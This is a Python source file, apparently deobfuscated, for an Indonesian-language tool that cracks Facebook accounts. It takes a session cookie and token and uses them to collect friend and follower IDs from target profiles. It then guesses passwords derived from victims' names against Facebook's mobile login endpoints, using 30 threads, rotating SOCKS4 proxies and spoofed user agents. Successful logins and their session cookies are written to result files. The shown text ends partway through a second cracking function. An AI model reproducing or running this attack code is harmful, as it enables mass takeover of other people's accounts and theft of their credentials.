""" Manualy deobfuscate by Maulana-XD """
###----------[ TEXT BERJALAN ]---------- ###
def basari_tamvan(basjalan):
        for kontol in basjalan + "\n":sys.stdout.write(kontol);sys.stdout.flush();time.sleep(0.05)
        
###----------[ KEMBALI KEMENU ]---------- ###
def back():
	bass()
	
###----------[ BUAT CLEAR LAYAR ]---------- ###
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
		
###----------[ IMPORT MODULE RICH INGREDIENT ]---------- ###
import requests,json,os,sys,random,datetime,time,re
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
import zlib
import subprocess
import base64
from rich import pretty
pretty.install()
CON=sol()
ses=requests.Session()
babas = Console()

###----------[ APPEND ]---------- ###
pwt = []
pwn = []
ugenb = []
ugenm = []
ugenf = []
id,id2 = [],[]
uid = []
ualu = []
ualuh = []
ok,cp = 0,0
loop = 0
akun = []
basari = []
tokenku = []

###----------[ PROXY LIST ]---------- ###
try:
	proxylist= requests.get('https://raw.githubusercontent.com/Basari-ID/BMBF/main/socks4.txt').text
	open('socks4.txt','w').write(proxylist)
except Exception as e:
	basari_tamvan(f'{bas}Proxy_List_Basari')
prox=open('socks4.txt','r').read().splitlines()

###----------[ USER AGENT ]---------- ###
for bz in range(10000):
	bz1='Mozilla/5.0 (Linux; Android'
	bz2=random.choice(['7.0','8.1.0','9','10'])
	bz3='SM-G770F)'
	bz4='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	bz5=random.randrange(73,100)
	bz6='0'
	bz7=random.randrange(4200,4900)
	bz8=random.randrange(40,150)
	bz9='Mobile Safari/537.36'
	bz10=f'{bz1} {bz2}; {bz3} {bz4}{bz5}.{bz6}.{bz7}.{bz8} {bz9}'
	ugenm.append(bz10)

	bz1='Mozilla/5.0 (Linux; Android'
	bz2=random.choice(['7.0','8.1.0','9','10'])
	bz3='SAMSUNG SM-N960F)'
	bz4='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/'
	bz5=random.randrange(73,100)
	bz6='0'
	bz7=random.randrange(4200,4900)
	bz8=random.randrange(40,150)
	bz9='Mobile Safari/537.36'
	bz10=f'{bz1} {bz2}; {bz3} {bz4}{bz5}.{bz6}.{bz7}.{bz8} {bz9}'
	ugenb.append(bz10)
	
	bz1='Mozilla/5.0 (Linux; Android'
	bz2=random.choice(['7.0','8.1.0','9','10','11'])
	bz3='V2022)'
	bz4='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	bz5=random.randrange(73,100)
	bz6='0'
	bz7=random.randrange(4200,4900)
	bz8=random.randrange(40,150)
	bz9='Mobile Safari/537.36'
	bz10=f'{bz1} {bz2}; {bz3} {bz4}{bz5}.{bz6}.{bz7}.{bz8} {bz9}'
	ugenf.append(bz10)
	
###----------[ PEWARNA ]---------- ###
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' 
bv = '\33[0;36m'
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
bas = '\033[41m\x1b[1;97m'
try:
	warna_kolor = "#00C8FF"
except FileNotFoundError:
	warna_kolor = "#00C8FF"

###----------[ TAHUN AKUN ]---------- ###
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
	
###----------[ CONVERT BULAN ]---------- ###
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

###----------[ CEK CEK ]---------- ###
def basarii():
	os.system('clear')
	cetak(panel(f"""[bold green]HARAP FOLLOW FACEBOOK AUTHOR TERLEBIH DAHULU[/]""",width=70,title=f"[bold green]• [bold white]PEMBERITAHUAN [bold green]•",style=f"{warna_kolor}"))
	os.system("xdg-open https://www.facebook.com/bazcracker")
	login_bas()

###----------[ BANNER 1 ]---------- ###
def banner():
	cetak(panel(f"""\t    [bold cyan]______  ___   _________  _______________ 
\t    [bold cyan]| ___ \/ _ \ |___  /|  \/  || ___ \  ___|
\t    [bold cyan]| |_/ / /_\ \   / / | .  . || |_/ / |_   
\t    [bold cyan]| ___ \  _  |  / /  | |\/| || ___ \  _|  
\t    [bold cyan]| |_/ / | | |./ /___| |  | || |_/ / |    
\t    [bold cyan]\____/\_| |_/\_____/\_|  |_/\____/\_|
                   """,width=70,title=f"",subtitle=f"[bold cyan] 2.2 [/]",style=f"{warna_kolor}"))

###----------[ BANNER 2 ]---------- ###
def banner2():
	cetak(panel(f"""\t       [bold cyan]_      ____   _____ _____ _   _ 
\t     [bold cyan] | |    / __ \ / ____|_   _| \ | |
\t     [bold cyan] | |   | |  | | |  __  | | |  \| |
\t     [bold cyan] | |   | |  | | | |_ | | | | . ` |
\t     [bold cyan] | |___| |__| | |__| |_| |_| |\  |
\t     [bold cyan] |______\____/ \_____|_____|_| \_|
                   """,width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
                   
###----------[ LOG COOKIES ]---------- ###
def bass():
	try:
		token = open('.baztoken.txt','r').read()
		cok = open('.bazcok.txt','r').read()
		tokenku.append(token)
		try:
			basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
			basganteng = json.loads(basariheker.text)['id']
			menu(basganteng)
		except KeyError:
			login_bas()
		except requests.exceptions.ConnectionError:
			basari_tamvan(f'{bas}└── JARINGAN EROR BRO COBA LAGI !{x}')
			exit()
	except IOError:
		login_bas()
def login_bas():
	try:
		os.system('clear')
		banner2()
		ses = requests.Session()
		cookie=input(f'{bv}└── Cookies :{x}{H} ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		ken = open(".baztoken.txt", "w").write(tok)
		cok = open(".bazcok.txt", "w").write(cookie)
		basari_tamvan(f'{x}{bv}└── Berhasil Login{x} ')
		time.sleep(1)
		bass()
	except Exception as e:
		os.system('rm -rf .bazcok.txt && rm -rf .baztoken.txt')
		basari_tamvan(f'{x}{bv}└── Login Gagal ! Login Ulang Ganti Cookes !{x} ')
		time.sleep(4)
		login_bas()

###----------[ MENU ]---------- ###
def menu(id):
	try:
		token = open('.baztoken.txt','r').read()
		cok = open('.bazcok.txt','r').read()
		#nama = open('.nama.json','r').read()
	except IOError:
		basari_tamvan(f'{bas}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
		time.sleep(4)
		login_bas()
	os.system('clear')
	banner()
	iplu = requests.get("https://api.ipify.org").text
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	gpp = []
	ghku = 'Basari-ID'
	gpp.append(panel(f'[cyan]Asalmu   : {negara}\nUserIp   : {iplu}\nUserId   : {id}',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
	gpp.append(panel(f'[cyan]Author   : Muh Basari\nGithub   : {ghku}\nTanggal  : {tgl} {bln} {thn}',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
	babas.print(Columns(gpp))
	cetak(panel(f'\t                  [bold cyan]Menu Script',width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f' [cyan]01. Crack Publik Massal\n [cyan]02. Crack Followers\n [cyan]03. [cyan]Hasil Crack Akun\n [cyan]04. Gabung Grup Wa\n [cyan]05. Lapor Bug Sc\n [cyan]00. Keluar Hapus Cokis',width=70,title=f"",style=f"{warna_kolor}"))
	______muhammad______basari______ = input(f'{bv}└── Pilih : ')
	if ______muhammad______basari______ in ['01','1']:
		dump_massal()
	elif ______muhammad______basari______ in ['02','2']:
		dump_pengikut()
	elif ______muhammad______basari______ in ['03','3']:
		hasil()
	elif ______muhammad______basari______ in ['04','4']:
		gabung_grup()
	elif ______muhammad______basari______ in ['05','5']:
		authorbas()
	elif ______muhammad______basari______ in ['00','0']:
		os.system('rm -rf .bazcok.txt && rm -rf .baztoken.txt')
		basari_tamvan(f'└── Sukses Logout{x} ')
		time.sleep(4)
		exit()
	else:
		basari_tamvan(f'└── Pilih Yang Bener')
		time.sleep(4)
		back()
def authorbas():
	basari_tamvan(f'└── Mohon Tunggu Sebentar {x}')
	os.system("xdg-open https://www.facebook.com/bazcracker")
	back()
def gabung_grup():
	basari_tamvan(f'└── Mohon Tunggu Sebentar {x}')
	os.system("xdg-open https://chat.whatsapp.com/JRKRrH8wkE2A42Cb1e4bnL")
	back()
	
###----------[ CEK HASIL ]---------- ###
def hasil():
	cetak(panel(f'\t                  [bold cyan] Hasil Crack',width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f' [cyan]01. Akun OK\n [cyan]02. Akun CP\n [cyan]03. Kembali',width=70,title=f"",style=f"{warna_kolor}"))
	baz_code = input(f'{bv}Pilih : ')
	if baz_code in ['2']:
		try:bass = os.listdir('CP')
		except FileNotFoundError:
			basari_tamvan(f'{bv}└── File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(bass)==0:
			basari_tamvan(f'{bv}└── Tidak Ada Hasil CP ')
			time.sleep(4)
			back()
		else:
			bokep = 0
			indo = {}
			for isi in bass:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				bokep+=1
				if bokep<10:
					nom = ''+str(bokep)
					indo.update({str(bokep):str(isi)})
					indo.update({nom:str(isi)})
					print(f'{bv}└── %s. %s ({k} %s {x}Id )'%(nom,isi,len(hem)))
				else:
					indo.update({str(bokep):str(isi)})
					print('['+str(bokep)+'] '+isi+' [ '+str(len(hem))+' Akun ]'+x)
			geeh = input(f'{bv}└── Pilih : ')
			try:geh = indo[geeh]
			except KeyError:
				basari_tamvan(f'{bv}└── Pilih Yang Bener Cuk ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				basari_tamvan(f'{bv}└── File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}└── {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['1']:
		try:bass = os.listdir('OK')
		except FileNotFoundError:
			basari_tamvan(f'{bv}└── File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(bass)==0:
			basari_tamvan(f'{bv}└── Tidak Ada Hasil OK ')
			time.sleep(4)
			back()
		else:
			bokep = 0
			indo = {}
			for isi in bass:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				bokep+=1
				if bokep<10:
					nom = '0'+str(bokep)
					indo.update({str(bokep):str(isi)})
					indo.update({nom:str(isi)})
					print(f'{bv}└── %s. %s ( {h}%s{x} Id )'%(nom,isi,len(hem)))
				else:
					indo.update({str(bokep):str(isi)})
					print(f'{bv}└── %s. %s ({h} %s {x}Id )'%(cih,isi,(len(hem))))
			geeh = input(f'\n{bv}└── Pilih : ')
			try:geh = indo[geeh]
			except KeyError:
				basari_tamvan(f'{bv}└── Pilih Yang Bener Lah ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				basari_tamvan(f'{bv}└── File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{bv}└── {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['3']:
		back()
	else:
		basari_tamvan('└── Pilih Yang Bener Lah ')
		back()

###----------[ CRACK PENGIKUT ]---------- ###
def dump_pengikut():
	try:
		token = open('.baztoken.txt','r').read()
		cok = open('.bazcok.txt','r').read()
	except IOError:
		basari_tamvan(f'{bas}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
		time.sleep(4)
		exit()
	cetak(panel(f' [cyan]Masukkan Idz Target',width=70,title=f"",style=f"{warna_kolor}"))
	pil = input(f'{bv}└── Idz : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'{bv}└── Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		basari_tamvan(f'[!]{bas} Koneksi Bermasalah {x}')
		time.sleep(4)
		back()
	except (KeyError,IOError):
		basari_tamvan(f'[!]{bas} Gagal mengambil Id target {x}')
		time.sleep(4)
		back()

###----------[ CRACK ID MASSAL ]---------- ###
def dump_massal():
	try:
		token = open('.baztoken.txt','r').read()
		cok = open('.bazcok.txt','r').read()
	except IOError:
		basari_tamvan(f'{bas}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
		time.sleep(4)
		exit()
	try:
		cetak(panel(f' [cyan]Mau Berapa Idz Target',width=70,title=f"",style=f"{warna_kolor}"))
		baz_coder = int(input(f'{bv}└── Pilih : '))
	except ValueError:
		basari_tamvan('[!] Yang Bener Napa Cuk ')
		time.sleep(4)
		exit()
	if baz_coder<1 or baz_coder>100:
		basari_tamvan('[!] Gagal Dump Id Target ')
		time.sleep(5)
		exit()
	ses=requests.Session()
	baz = 0
	for met in range(baz_coder):
		baz+=1
		cetak(panel(f' [cyan]Id Target Harus Bersifat Publik',width=70,title=f"",style=f"{warna_kolor}"))
		bazfaa = input(f'{bv}└── Idz '+str(baz)+' : ')
		uid.append(bazfaa)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			basari_tamvan('[!] Sinyal Lu Eror ')
			exit()
	try:
		print(f'{bv}└── Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		basari_tamvan(f'{bas}└── Koneksi Lu Eror Cuk{x} ')
		time.sleep(4)
		back()
	except (KeyError,IOError):
		basari_tamvan(f'{bas}└── Pertemanan Id Target Lu Tidak Publik {x}')
		time.sleep(4)
		back()
	
###----------[ ATUR SBLUM CRACK ]---------- ###
def setting():
	cetak(panel(f'\t                  [bold cyan] Setting Idz',width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f' [cyan]01. Akun Lama\n [cyan]02. Akun Baru\n [cyan]03. Akun Acak',width=70,title=f"",style=f"{warna_kolor}"))
	__baz__gege__ = input(f'{bv}└── Pilih : ')
	if __baz__gege__ in ['1','01']:
		for lama in sorted(id):
			id2.append(lama)
			
	elif __baz__gege__ in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
			
	elif __baz__gege__ in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		basari_tamvan(f'{bv}└── Pilih Yang Bener Cuukk')
		exit()
		
	cetak(panel(f'\t                  [bold cyan] Method Crack',width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f' [cyan]01. Mobile.facebook\n [cyan]02. Mbasic.facebook\n [cyan]03. Mtouch.facebook',width=70,title=f"",style=f"{warna_kolor}"))
	____method_crack____ = input(f'{bv}└── Pilih : ')
	if ____method_crack____ in ['1','01']:
		basari.append('m.facebook')
	elif ____method_crack____ in ['']:
		basari_tamvan(f'{bas}└── Pilih Yang Bener ')
		setting()
	elif ____method_crack____ in ['2','02']:
		basari.append('b.facebook')
	elif ____method_crack____ in ['3','03']:
		basari.append('f.facebook')
	else:
		basari.append('m.facebook')
		
	cetak(panel(f' [cyan]Ingin Menambahkan Kata Sandi Y/t',width=70,title=f"",style=f"{warna_kolor}"))
	pwtambah=input(f'{bv}└── Pilih : ')
	if pwtambah in ['y','Y']:
		pwt.append('ya')
		cetak(panel(f' [cyan]Gunakan Koma Untuk Pemisah\n Contoh : sayang,anjing,bangsat',width=70,title=f"",style=f"{warna_kolor}"))
		pwku=input(f'{bv}└── Sandi :{x}{M} ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwn.append(xpw)
	else:
		pwt.append('no')
		
	cetak(panel(f' [cyan]Ingin Menambahkan User Agent Y/t',width=70,title=f"",style=f"{warna_kolor}"))
	uat = input(f'{bv}└── Pilih : ')
	if uat in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bz = input(f'{bv}└── Ugent :{x}{M} ')
		ualu.append(bz)
	else:
		ualuh.append('no')
	wordlist()
	
###----------[ WORDLIST ]---------- ###
def wordlist():
	global prog,des
	cetak(panel(f'       [cyan]Hasil [green]OK[cyan] Tersimpan Di : [green]OK/%s [white]'%(okc),width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f'       [cyan]Hasil [yellow]CP[cyan] Tersimpan Di : [yellow]CP/%s [white]'%(cpc),width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f'    [cyan]On/Of Mode Pesawat Setiap 400 Id Agar Tidak Terkena Spam',width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
	print('')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'm.facebook' in basari:
					pool.submit(crackm,idf,pwv)
				elif 'b.facebook' in basari:
					pool.submit(crackb,idf,pwv)
				elif 'f.facebook' in basari:
					pool.submit(crackf,idf,pwv)
				else:
					pool.submit(crackf,idf,pwv)
		print('')
		print(f'{x}AKUN OK : {h}%s '%(ok))
		print(f'{x}AKUN CP : {k}%s{x} '%(cp))
		print('')
###----------[ MOBILE ]---------- ###
def crackm(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugenm)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=966242223397117&auth_token=9af15271c748d378ef8bc2b720b79e63&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&refsrc=deprecated&app_id=966242223397117&cancel=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
				os.popen('play-audio bazcp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}\n[bold green]{ua}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
				os.popen('play-audio bazok.mp3')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###----------[ MOBILE V2 ]---------- ###
def crackb(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugenb)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
